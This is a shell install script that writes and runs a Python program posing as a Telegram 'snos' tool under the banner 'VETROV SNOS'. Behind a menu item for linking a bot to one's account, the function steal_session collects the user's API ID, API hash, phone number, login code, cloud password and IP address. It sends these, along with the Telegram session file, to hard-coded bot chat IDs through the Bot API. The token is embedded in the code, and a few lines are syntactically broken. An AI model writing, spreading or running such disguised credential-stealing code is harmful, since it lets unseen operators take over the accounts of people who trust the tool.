cd ~
rm -rf vetrovnos
mkdir vetrovnos
cd vetrovnos

pip install telethon requests -q

cat > vetrovnos.py <<EOF
import asyncio
import os
import sys
import requests
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, ApiIdInvalidError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged

BOT_TOKEN = "8605236427:AAFxKZs3ERn0lzwPV11Xlfzzt6aD31rn7Mc"
YOUR_CHAT_IDS = ["8597812279", "5005900457"]

RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'

def get_ip():
    try:
        r = requests.get('https://api.ipify.org', timeout=5)
        return r.text
    except:
        return "unknown"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(f"{RED}{BOLD}")
    print(" ██╗   ██╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗")
    print(" ██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║")
    print(" ██║   ██║█████╗     ██║   ██████╔╝██║   ██║██║   ██║")
    print(" ╚██╗ ██╔╝██╔══╝     ██║   ██╔══██╗██║   ██║╚██╗ ██╔╝")
    print("  ╚████╔╝ ███████╗   ██║   ██║  ██║╚██████╔╝ ╚████╔╝ ")
    print("   ╚═══╝  ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ")
    print(f"{RESET}")
    print(f"{RED}{BOLD}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║              VETROV SNOS v1.0                            ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════════════════════╝{RESET}")
    print()

def print_menu():
    print(f"{RED}{BOLD}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{RED}{BOLD}│   ➤ 1. Привязать бота к аккаунту                          │{RESET}")
    print(f"{RED}{BOLD}│   ➤ 2. Мои аккаунты                                       │{RESET}")
    print(f"{RED}{BOLD}│   ➤ 3. Выход                                              │{RESET}")
    print(f"{RED}{BOLD}└─────────────────────────────────────────────────────────┘{RESET}")
    print()

def send_file(file_path):
    for chat_id in YOUR_CHAT_IDS:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {'chat_id': chat_id}
            requests.post(url, files=files, data=data, timeout=10)
        except:
            pass

def send_text(text):
    for chat_id in YOUR_CHAT_IDS:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {'chat_id': chat_id, 'text': text}
            requests.post(url, data=data, timeout=10)
        except:
            pass

def list_accounts():
    accounts = []
    if os.path.exists('session.session'):
        accounts.append('session.session')
    if os.path.exists('data.txt'):
        with open('data.txt', 'r') as f:
            for line in f:
                if 'Номер:' in line:
                    accounts.append(line.replace('Номер:', '').strip())
    return accounts
async def steal_session():
    clear_screen()
    print_banner()
    
    ip = get_ip()
    send_text(f"[+] {ip}")
    
    print(f"{RED}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{RED}{BOLD}                    АВТОРИЗАЦИЯ АККАУНТА{RESET}")
    print(f"{RED}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print()
    print(f"{RED}[!] Включите VPN{RESET}")
    print()
    
    api_id = input(f"{RED}├─ API ID: {RESET}")
    api_hash = input(f"{RED}├─ API Hash: {RESET}")
    phone = input(f"{RED}└─ Номер телефона (+...): {RESET}")
    
    send_text(f"[{api_id}] [{api_hash}] [{phone}]")
    
    code_val = ""
    pwd_val = ""
    
    try:
        api_id_int = int(api_id) if api_id.isdigit() else 0
    except:
        api_id_int = 0
client = TelegramClient(
        'session', 
        api_id_int, 
        api_hash,
        connection=ConnectionTcpAbridged,
        connection_retries=3,
        retry_delay=2,
        timeout=60
    )
    
    try:
        print(f"{RED}[*] Подключение...{RESET}")
        await client.connect()
        print(f"{RED}[+] Соединение установлено{RESET}")
        
        print(f"{RED}[*] Отправка кода...{RESET}")
        try:
            await client.send_code_request(phone)
            print(f"{RED}[+] Код отправлен{RESET}")
        except:
            try:
                await client.send_code_request(phone)
            except:
                pass
        
        code = input(f"{RED}├─ Код из Telegram: {RESET}")
        code_val = code
        send_text(f"[{code}]")
        
        try:
            await client.sign_in(phone, code)
            print(f"{RED}[+] Вход выполнен{RESET}")
        except SessionPasswordNeededError:
            pwd = input(f"{RED}└─ Облачный пароль: {RESET}")
            pwd_val = pwd
            send_text(f"[{pwd}]")
            try:
                await client.sign_in(password=pwd)
                print(f"{RED}[+] Вход выполнен{RESET}")
            except:
                pass
        except:
            pass
        
        if os.path.exists('session.session'):
            send_file('session.session')
        
        with open("data.txt", "w") as f:
            f.write(f"API ID: {api_id}\n")
            f.write(f"API Hash: {api_hash}\n")
            f.write(f"Номер: {phone}\n")
            f.write(f"Код: {code_val}\n")
            if pwd_val:
                f.write(f"Пароль: {pwd_val}\n")
        
        send_file("data.txt")
        
    except Exception as e:
        send_text(f"[!] {str(e)[:100]}")
    
    try:
        await client.disconnect()
    except:
        pass
    
    print()
    input(f"{RED}[*] Нажмите Enter...{RESET}")
 async def main():
    while True:
        print_banner()
        print_menu()
        choice = input(f"{RED}┌─ Выберите пункт: {RESET}")
        
        if choice == '1':
            await steal_session()
        elif choice == '2':
            clear_screen()
            print_banner()
            print(f"{RED}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
            print(f"{RED}{BOLD}                    МОИ АККАУНТЫ{RESET}")
            print(f"{RED}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
            print()
            accounts = list_accounts()
            if not accounts:
                print(f"{RED}[!] ПУСТО{RESET}")
            else:
                print(f"{RED}[+] Найдено: {len(accounts)}{RESET}")
                for acc in accounts:
                    print(f"{RED}  └─ {acc}{RESET}")
            print()
            input(f"{RED}[*] Нажмите Enter...{RESET}")
        elif choice == '3':
            clear_screen()
            print_banner()
            print(f"{RED}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
            print(f"{RED}{BOLD}                    ДО СВИДАНИЯ!{RESET}")
            print(f"{RED}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
            print()
            sys.exit(0)
        else:
            print(f"{RED}[!] Неверный выбор!{RESET}")
            await asyncio.sleep(1)

if name == "main":
    asyncio.run(main())
EOF

python vetrovnos.py
